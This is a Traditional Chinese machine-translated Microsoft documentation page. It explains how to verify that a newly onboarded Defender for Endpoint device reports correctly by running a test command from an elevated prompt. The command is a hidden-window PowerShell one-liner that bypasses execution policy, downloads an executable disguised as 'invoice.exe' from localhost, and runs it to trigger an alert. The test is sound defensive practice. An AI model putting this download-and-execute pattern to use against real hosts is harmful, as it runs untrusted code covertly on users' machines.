---
title: 在新架的 Microsoft Defender for Endpoint 裝置上執行偵測測試
description: 在新架裝置上執行偵測腳本，確認已正確架至 Microsoft Defender for Endpoint service。
keywords: 偵測測試，偵測，powershell，script，verify，上架，microsoft defender for endpoint 上架，用戶端，伺服器，測試
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 89b8ac7d99cfcd4c5e5e647e5ba54e14184ef0bd
ms.sourcegitcommit: 3fe7eb32c8d6e01e190b2b782827fbadd73a18e6
ms.translationtype: MT
ms.contentlocale: zh-TW
ms.lasthandoff: 04/13/2021
ms.locfileid: "51688114"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a><span data-ttu-id="971d1-104">在新架的 Microsoft Defender for Endpoint 裝置上執行偵測測試</span><span class="sxs-lookup"><span data-stu-id="971d1-104">Run a detection test on a newly onboarded Microsoft Defender for Endpoint device</span></span> 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


<span data-ttu-id="971d1-105">**適用於：**</span><span class="sxs-lookup"><span data-stu-id="971d1-105">**Applies to:**</span></span>
- <span data-ttu-id="971d1-106">支援的 Windows 10 版本</span><span class="sxs-lookup"><span data-stu-id="971d1-106">Supported Windows 10 versions</span></span>
- <span data-ttu-id="971d1-107">Windows Server 2012 R2</span><span class="sxs-lookup"><span data-stu-id="971d1-107">Windows Server 2012 R2</span></span>
- <span data-ttu-id="971d1-108">Windows Server 2016</span><span class="sxs-lookup"><span data-stu-id="971d1-108">Windows Server 2016</span></span>
- <span data-ttu-id="971d1-109">Windows Server，版本1803</span><span class="sxs-lookup"><span data-stu-id="971d1-109">Windows Server, version 1803</span></span>
- <span data-ttu-id="971d1-110">Windows Server，2019</span><span class="sxs-lookup"><span data-stu-id="971d1-110">Windows Server, 2019</span></span>
- [<span data-ttu-id="971d1-111">適用於端點的 Microsoft Defender</span><span class="sxs-lookup"><span data-stu-id="971d1-111">Microsoft Defender for Endpoint</span></span>](https://go.microsoft.com/fwlink/?linkid=2154037)
- [<span data-ttu-id="971d1-112">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="971d1-112">Microsoft 365 Defender</span></span>](https://go.microsoft.com/fwlink/?linkid=2118804)

> <span data-ttu-id="971d1-113">想要體驗 Microsoft Defender for Endpoint？</span><span class="sxs-lookup"><span data-stu-id="971d1-113">Want to experience Microsoft Defender for Endpoint?</span></span> [<span data-ttu-id="971d1-114">註冊免費試用版。</span><span class="sxs-lookup"><span data-stu-id="971d1-114">Sign up for a free trial.</span></span>](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

<span data-ttu-id="971d1-115">在新架裝置上執行下列 PowerShell 腳本，以確認是否已將其正確報告至端點服務的 Defender。</span><span class="sxs-lookup"><span data-stu-id="971d1-115">Run the following PowerShell script on a newly onboarded device to verify that it is properly reporting to the Defender for Endpoint service.</span></span>

1. <span data-ttu-id="971d1-116">建立資料夾： ' C:\test-MDATP-test '。</span><span class="sxs-lookup"><span data-stu-id="971d1-116">Create a folder:  'C:\test-MDATP-test'.</span></span>
2. <span data-ttu-id="971d1-117">在裝置上開啟已提升許可權的命令列提示字元，並執行腳本：</span><span class="sxs-lookup"><span data-stu-id="971d1-117">Open an elevated command-line prompt on the device and run the script:</span></span>

   1. <span data-ttu-id="971d1-118">轉至 **[開始]** 並鍵入 **「cmd」**。</span><span class="sxs-lookup"><span data-stu-id="971d1-118">Go to **Start** and type **cmd**.</span></span>

   1. <span data-ttu-id="971d1-119">以滑鼠右鍵按一下 [ **命令提示** 字元]，然後選取 [ **以管理員身分執行**]。</span><span class="sxs-lookup"><span data-stu-id="971d1-119">Right-click **Command Prompt** and select **Run as administrator**.</span></span>

      ![指向以系統管理員身分執行的視窗「開始」功能表](images/run-as-admin.png)

3. <span data-ttu-id="971d1-121">在出現提示時，請複製並執行下列命令：</span><span class="sxs-lookup"><span data-stu-id="971d1-121">At the prompt, copy and run the following command:</span></span>

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

<span data-ttu-id="971d1-122">[命令提示字元] 視窗將會自動關閉。</span><span class="sxs-lookup"><span data-stu-id="971d1-122">The Command Prompt window will close automatically.</span></span> <span data-ttu-id="971d1-123">如果成功，則偵測測試會標示為已完成，並且在架裝置的入口網站中大約10分鐘會出現新的警示。</span><span class="sxs-lookup"><span data-stu-id="971d1-123">If successful, the detection test will be marked as completed and a new alert will appear in the portal for the onboarded device in approximately 10 minutes.</span></span>

## <a name="related-topics"></a><span data-ttu-id="971d1-124">相關主題</span><span class="sxs-lookup"><span data-stu-id="971d1-124">Related topics</span></span>
- [<span data-ttu-id="971d1-125">將 Windows 10 裝置上線</span><span class="sxs-lookup"><span data-stu-id="971d1-125">Onboard Windows 10 devices</span></span>](configure-endpoints.md)
- [<span data-ttu-id="971d1-126">上架伺服器</span><span class="sxs-lookup"><span data-stu-id="971d1-126">Onboard servers</span></span>](configure-server-endpoints.md)
- [<span data-ttu-id="971d1-127">疑難排解 Microsoft Defender 的端點上架問題</span><span class="sxs-lookup"><span data-stu-id="971d1-127">Troubleshoot Microsoft Defender for Endpoint onboarding issues</span></span>](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
